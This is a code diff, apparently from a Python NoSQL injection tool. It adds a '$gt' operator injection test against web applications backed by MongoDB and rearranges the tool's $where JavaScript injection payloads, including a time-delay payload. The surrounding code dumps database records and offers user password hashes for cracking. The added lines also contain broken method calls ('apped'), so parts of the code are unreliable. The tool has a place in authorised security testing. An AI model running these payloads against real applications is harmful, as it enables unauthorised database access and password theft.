@@ -449,6 +449,7 @@ def postApps():
 	trueInt = False
 	global postData
 	global neDict
+	global gtDict
 	testNum = 1
 	
 	#Verify app is working.  
@@ -553,6 +554,27 @@ def postApps():
 		
 		#Delete the extra key
 		del postData[injOpt + "[$ne]"]
+		
+		#generate $gt injection
+		gtDict = postData
+		gtDict.update({injOpt:""})
+		gtDict[injOpt + "[$gt]"] = gtDict[injOpt]
+		del gtDict[injOpt]
+		body = urllib.urlencode(gtDict)
+		req = urllib2.Request(appURL,body)
+		if verb == "ON":
+			print "Testing PHP/ExpressJS >Undefined Injection using " + str(postData) + "..."
+		
+		else:
+			print "Test 2:  PHP/ExpressJS > Undefined Injection"
+		
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))			
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
 		postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
@@ -561,7 +583,7 @@ def postApps():
 			print "Injecting " + str(postData)
 		
 		else:
-			print "Test 2: $where injection (string escape)"
+			print "Test 3: $where injection (string escape)"
 		
 		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 		
@@ -581,7 +603,7 @@ def postApps():
 			print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
 			print "Injecting " + str(postData)
 		else:
-			print "Test 3: $where injection (integer escape)"
+			print "Test 4: $where injection (integer escape)"
 		
 		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 		
@@ -602,7 +624,7 @@ def postApps():
 			print " Injecting " + str(postData)
 		
 		else:
-			print "Test 4: $where injection string escape (single record)"
+			print "Test 5: $where injection string escape (single record)"
 		
 		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 		
@@ -623,7 +645,7 @@ def postApps():
 			print " Injecting " + str(postData)
 		
 		else:
-			print "Test 5: $where injection integer escape (single record)"
+			print "Test 6: $where injection integer escape (single record)"
 		
 		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 		
@@ -645,7 +667,7 @@ def postApps():
 			print " Injecting " + str(postData)
 		
 		else:
-			print "Test 6: This != injection (string escape)"
+			print "Test 7: This != injection (string escape)"
 		
 		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 		
@@ -665,7 +687,7 @@ def postApps():
 			print "Testing Mongo this not equals integer escape attack for all records..."
 			print " Injecting " + str(postData)
 		else:
-			print "Test 7:  This != injection (integer escape)"
+			print "Test 8:  This != injection (integer escape)"
 		
 		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 		
@@ -969,12 +991,26 @@ def getApps():
 			testNum += 1
 		print "\n"
 		
+		if verb == "ON":
+			print "Testing  PHP/ExpressJS > undefined attack for all records..."
+			print "Injecting " + uriArray[8]
+		
+		else:
+			print "Test 8: PHP/ExpressJS > Undefined Injection"
+			
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[8]).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[8]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
 		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
 		
 		if doTimeAttack in yes_tag:
 			print "Starting Javascript string escape time based injection..."
 			start = time.time()
-			strTimeInj = urllib.urlopen(uriArray[8])
+			strTimeInj = urllib.urlopen(uriArray[18])
 			page = strTimeInj.read()
 			end = time.time()
 			strTimeInj.close()
@@ -1066,6 +1102,7 @@ def errorTest (errorCheck,testNum):
 	global possAddrs
 	global httpMethod
 	global neDict
+	global gtDict
 	global postData
 	
 	if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
@@ -1079,6 +1116,11 @@ def errorTest (errorCheck,testNum):
 			if testNum == 1:
 				possAddrs.append(str(neDict))
 				return True
+			
+			elif testNum == 2:
+				possAddrs.apped(str(gtDict))
+				return True
+
 			else:
 				possAddrs.appends(str(postData))
 				return True
@@ -1095,6 +1137,7 @@ def checkResult(baseSize,respSize,testNum):
 	global int24
 	global httpMethod
 	global neDict
+	global gtDict
 	global postData
 	
 	delta = abs(respSize - baseSize)
@@ -1109,14 +1152,17 @@ def checkResult(baseSize,respSize,testNum):
 		else:
 			if testNum == 1:
 				vulnAddrs.append(str(neDict))
+			
+			elif testNum == 2:
+				vulnAddrs.apped(str(gtDict))
 			else:
 				vulnAddrs.append(str(postData))
 			
-		if testNum == 2 or testNum == 4:
+		if testNum == 3 or testNum == 5:
 			lt24 = True
 			str24 = True
 			
-		elif testNum == 3 or testNum == 5:
+		elif testNum == 4 or testNum == 6:
 			lt24 = True
 			int24 = True
 		return
@@ -1192,7 +1238,7 @@ def buildUri(origUri, randValue):
 	paramName = []
 	paramValue = []
 	global uriArray
-	uriArray = ["","","","","","","","","","","","","","","","","",""]
+	uriArray = ["","","","","","","","","","","","","","","","","","",""]
 	injOpt = ""
 	
 	#Split the string between the path and parameters, and then split each parameter
@@ -1243,6 +1289,7 @@ def buildUri(origUri, randValue):
 	uriArray[15] = split_uri[0] + "?"
 	uriArray[16] = split_uri[0] + "?"
 	uriArray[17] = split_uri[0] + "?"
+	uriArray[18] = split_uri[0] + "?"
 	
 	for item in paramName:		
 		if paramName[x] == injOpt:
@@ -1254,7 +1301,7 @@ def buildUri(origUri, randValue):
 			uriArray[5] += paramName[x] + "=1; return db.a.findOne(); var dummy=1" + "&"
 			uriArray[6] += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
 			uriArray[7] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
-			uriArray[8] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
+			uriArray[8] += paramName[x] + "[$gt]=&"
 			uriArray[9] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
 			uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy='!" + "&"
 			uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
@@ -1265,6 +1312,7 @@ def buildUri(origUri, randValue):
 			#Add values that can be manipulated for database attacks
 			uriArray[16] += paramName[x] + "=a\'; ---"
 			uriArray[17] += paramName[x] + "=1; if ---"
+			uriArray[18] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
 
 		else:
 			uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
@@ -1285,6 +1333,7 @@ def buildUri(origUri, randValue):
 			uriArray[15] += paramName[x] + "=" + paramValue[x] + "&"
 			uriArray[16] += paramName[x] + "=" + paramValue[x] + "&"
 			uriArray[17] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[18] += paramName[x] + "=" + paramValue[x] + "&"
 		x += 1
 		
 	#Clip the extra & off the end of the URL
@@ -1642,7 +1691,7 @@ def getDBInfo():
 			menuItem +=1
 				
 		userIndex = raw_input("Select user hash to crack: ")
-		passCrack(users[int(userIndex)-1],hashes[int(userIndex)-1])
+		nsmmongo.passCrack(users[int(userIndex)-1],hashes[int(userIndex)-1])
 		
 		crackHash = raw_input("Crack another hash (y/n)?")		
 	raw_input("Press enter to continue...")
